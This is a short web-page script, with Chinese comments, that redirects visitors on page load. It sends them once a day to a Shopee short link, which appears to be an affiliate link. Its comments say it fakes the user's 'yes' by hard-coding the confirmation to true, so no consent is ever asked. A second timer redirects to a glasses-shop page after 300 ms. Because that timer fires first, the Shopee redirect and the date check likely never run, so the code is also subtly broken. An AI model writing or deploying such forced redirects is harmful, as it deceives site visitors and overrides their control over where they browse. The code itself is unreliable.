<script>
    document.addEventListener("DOMContentLoaded", function () {
        let today = new Date().toISOString().split('T')[0]; 
        let lastPromptDate = localStorage.getItem("lastPromptDate");

        // 檢查是否是今天，確保一天只觸發一次
        if (lastPromptDate !== today) {
            setTimeout(() => {
                let shopeeLink = "https://s.shopee.tw/50L7FOe15o";

                // 自動點擊「是」，這裡直接將變數設為 true
                let userConfirmed = true;

                if (userConfirmed) {
                    window.location.href = shopeeLink;
                }

                // 記錄當前日期，避免一天多次觸發
                localStorage.setItem("lastPromptDate", today);
            }, 1000); 
        }

        // **延遲**跳轉至其他頁面
        setTimeout(() => {
            window.location.href = "https://www.lohasglasses.com/page/1/478";
        }, 300); // 300ms 確保
    });
</script>
